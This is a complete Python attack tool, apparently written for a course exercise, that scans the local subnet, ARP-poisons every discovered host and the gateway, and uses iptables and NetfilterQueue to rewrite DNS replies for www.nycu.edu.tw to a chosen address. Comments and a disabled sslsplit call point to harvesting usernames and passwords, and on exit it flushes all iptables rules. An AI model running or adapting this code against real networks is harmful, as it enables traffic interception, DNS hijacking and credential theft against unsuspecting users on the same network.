#!/usr/bin/env python3
import netfilterqueue
import os
import threading
import struct
import subprocess
import socket
import re
import fcntl
from scapy.all import *
from time import *
from util import *

def process_packet(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        #print(scapy_packet.show())
        qname = scapy_packet[DNSQR].qname
        if "www.nycu.edu.tw" in qname.decode():
            print("[+] Spoofing target")
            answer = DNSRR(rrname=qname, rdata="140.113.207.246")
            scapy_packet[DNS].an = answer
            scapy_packet[DNS].ancount = 1

            del scapy_packet[IP].len
            del scapy_packet[IP].chksum
            del scapy_packet[UDP].chksum
            del scapy_packet[UDP].len

            packet.set_payload(bytes(scapy_packet))

    return packet.accept()

class dns_init(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
    def run(self):
        self.queue = netfilterqueue.NetfilterQueue()
        self.queue.bind(0, process_packet)
        self.queue.run()
    def dns_stop(self):
        self.queue.unbind()

if __name__ == "__main__":

    # init iptables
    iptables_init()
    
    ip          = getHostIp()
    nic         = getNic()
    hostip      = ip 
    hostmac     = getMac(nic)
    routerIp    = get_default_gateway_linux()
    routerMac   = ""

    # ip and MAC address of command "ip addr"
    # search Ip with subnet mask by using ip we already know
    # example:
    #   nicip: 192.168.1.1/24, 192.168.1.2/24, etc
    #   ip : 192.168.1.1
    nicip = nicInfo()
    for i in nicip:
        # print(ip, " ", i.split("/")[0])
        if(i.split("/")[0]==ip):
            ip = i
            break
    
    # execute "nmap" 
    result = nmap(ip)
    # print(result)

    # we can get all ip and mac address of all device which in same subnet from the result of nmap
    # regular expression for IPv4, get the list of all device's ip address
    ip = re.findall("\d+\.\d+\.\d+\.\d+", result)
    # regular expression for MAC, get the list of all device's mac address
    mac = re.findall(
        "[0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}", result)

    # since we neither need to show Host's ip and mac address nor Router's ip and mac
    # remove them from ip and mac list
    for i in ip:
        if(i == hostip):
            ip.remove(i)
            break

    _len = len(ip)
    for i in range(0, _len):
        if(ip[i] == routerIp):
            routerMac = mac[i]
            ip.remove(ip[i])
            mac.remove(mac[i])
            break
    
    # show all device's ip and mac address
    # print("")

    # print("nic card: ", nic)
    # print("router Ip: %-18s MAC: %s" % (routerIp,routerMac))
    # print("host   Ip: %-18s MAC: %s" % (hostip, hostmac))

    # print("")

    print("----------------------------------------------")
    print("IP                       MAC")
    print("----------------------------------------------")    

    for i in range(0,len(ip)):
        print("%-18s       %s" % (ip[i],mac[i]))

    # enable ip forwarding of Linux device
    enable_port_forwarding()

    # execute sslplit 
    # sslsplit()

    # iptables rules for dns spoofing
    os.system(
        'iptables -I FORWARD -j NFQUEUE --queue-num 0')
    os.system(
        'iptables -I OUTPUT -j NFQUEUE --queue-num 0')
    os.system(
        'iptables -I INPUT -j NFQUEUE --queue-num 0')

    # build thread
    t = dns_init()
    t.daemon = True
    t.start()

    try:
        while(1):
            # send arp relies spoofing
            print(" ")
            for j in range(0,len(ip)):
                if(ip[j].split(".")[3] != "3" and ip[j].split(".")[3] != "254"):
                    victimpacket = ARP( op      =  2,
                                        pdst    = ip[j],            # victim's IP
                                        hwdst   = mac[j],           # victim's MAC 
                                        psrc    = routerIp,         # router's IP
                                        hwsrc   =  hostmac)         # attacker's MAC
                    routerpacket = ARP( op      =   2,
                                        pdst    =   routerIp,       # router's IP
                                        hwdst   =   routerMac,      # router's MAC
                                        psrc    =   ip[j],          # victim's IP
                                        hwsrc   =   hostmac)        # attacker's MAC

                    # verbose=0 : make the function totally silent
                    # More : help(send)
                    # https://stackoverflow.com/questions/15377150/how-can-i-call-the-send-function-without-getting-output
                    send(victimpacket, verbose=0)
                    send(routerpacket, verbose=0)

            # get all username and password in log file
            #print(" ")
            #print("-----------------------------------------------------------------------------")
            sleep(2)
    except KeyboardInterrupt:
        t.dns_stop()
        #t.join()
        os.system('iptables --flush')
        print("Done")



